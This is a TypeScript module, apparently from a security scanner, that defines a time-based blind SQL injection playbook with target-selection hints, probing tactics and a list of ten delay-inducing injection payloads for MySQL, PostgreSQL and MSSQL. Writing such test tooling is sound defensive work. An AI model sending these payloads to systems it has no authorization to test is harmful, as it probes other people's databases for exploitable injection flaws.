import type { Playbook } from "../types.js";

// Community-documented SQL-injection knowledge. Confirmation is time-based blind:
// each payload asks the database to sleep for a fixed delay, and sqliProbe reports
// a finding only when the injected request is measurably slower than a baseline —
// proof the database executed our SQL, not a reflected error string or a guess.
export const sqlInjection: Playbook = {
  vulnClass: "sqli",
  title: "SQL Injection (time-based blind)",
  references: [
    "OWASP WSTG-INPV-05 — Testing for SQL Injection",
    "PortSwigger Web Security Academy — SQL injection (Blind SQL injection)",
    "OWASP / PayloadsAllTheThings — SQL Injection (time-based)",
    "CWE-89 — Improper Neutralization of Special Elements used in an SQL Command",
  ],
  lookFor:
    "Parameters and fields that reach a database query: numeric ids (?id=, ?user=), filters, " +
    "sort/order columns, search terms, pagination, and login fields. Test both GET query parameters " +
    "and JSON/body values on the backend API.",
  tactics: [
    "Pick a parameter that likely reaches a query (an id, filter, search, or sort value).",
    "Build a urlTemplate with PAYLOAD at the injection point and run sqli_probe.",
    "The oracle times a baseline request against time-delay payloads across MySQL, PostgreSQL and MSSQL.",
    "Confirm only on a reproducible delay — the probe re-checks before reporting, so a single slow response is not a finding.",
  ],
  // Each payload sleeps 5 seconds; sqliProbe confirms when the injected request is
  // ~5s slower than the baseline. Variants cover the common engines and the common
  // breakouts (quote, double-quote, numeric, closing paren) and comment terminators.
  payloads: [
    "1' AND SLEEP(5)-- -",
    '1" AND SLEEP(5)-- -',
    "1 AND SLEEP(5)",
    "1') AND SLEEP(5)-- -",
    "1' OR SLEEP(5)-- -",
    "1'; WAITFOR DELAY '0:0:5'-- -",
    "1); WAITFOR DELAY '0:0:5'-- -",
    "1' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -",
    "1; SELECT PG_SLEEP(5)-- -",
    "1 OR PG_SLEEP(5)",
  ],
};
